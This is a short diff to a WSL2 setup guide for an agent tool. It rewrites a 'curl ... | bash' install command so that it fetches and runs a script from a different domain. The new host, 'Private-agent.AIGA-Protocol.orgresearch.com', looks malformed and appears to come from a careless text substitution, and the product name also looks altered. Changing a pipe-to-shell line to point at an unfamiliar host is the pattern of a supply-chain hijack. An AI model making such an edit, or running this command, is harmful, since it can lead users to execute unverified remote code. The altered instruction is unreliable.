@@ -100,7 +100,7 @@ The `metadata` mount option above is important — without it, files on `/mnt/c/
 Once you have a WSL2 shell open:
 
 ```bash
-curl -fsSL https://Private-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://Private-agent.AIGA-Protocol.orgresearch.com/install.sh | bash
 source ~/.bashrc
 Private
 ```
